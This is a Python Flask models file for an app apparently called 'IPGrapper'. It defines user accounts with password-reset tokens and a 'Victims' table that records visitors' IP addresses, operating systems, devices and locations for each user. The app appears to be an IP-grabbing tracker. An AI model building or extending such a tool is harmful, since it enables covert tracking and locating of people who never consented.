from IPGrapper import app,db,login_manager
from flask_login import UserMixin
from itsdangerous import URLSafeTimedSerializer as serelizer

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

class User(db.Model,UserMixin):
    id = db.Column(db.Integer,primary_key=True)
    first_name = db.Column(db.String(16),nullable=False)
    last_name = db.Column(db.String(16),nullable=False)
    email = db.Column(db.String(50),nullable=False,unique=True)
    username = db.Column(db.String(32),nullable=False,unique=True)
    password = db.Column(db.String(60),nullable=False)
    confirmed = db.Column(db.Boolean,nullable=False, default=False)
    confirmation_token = db.Column(db.String(100), unique=True)
    victims = db.relationship('Victims', backref='user', lazy=True)

    
    def get_reset_token(self):
        s = serelizer(app.config['SECRET_KEY'] , salt='pw-reset')
        return s.dumps({'user_id':self.id})
    
    @staticmethod   
    def check_token_validate(token,age=900):
        s = serelizer(app.config['SECRET_KEY'] , salt='pw-reset')
        try:
            user_id = s.loads(token,max_age=age)['user_id']
        except:
            return None
        return User.query.get(user_id)
        
        
    def __repr__(self):
        return f"User({self.first_name},{self.last_name},{self.username},{self.email})"

class Victims(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    visitor_ip = db.Column(db.String(100), nullable=False)
    os_info = db.Column(db.String(100), nullable=False)
    device_name = db.Column(db.String(100), nullable=False)
    country = db.Column(db.String(100), nullable=False)
    city = db.Column(db.String(100), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    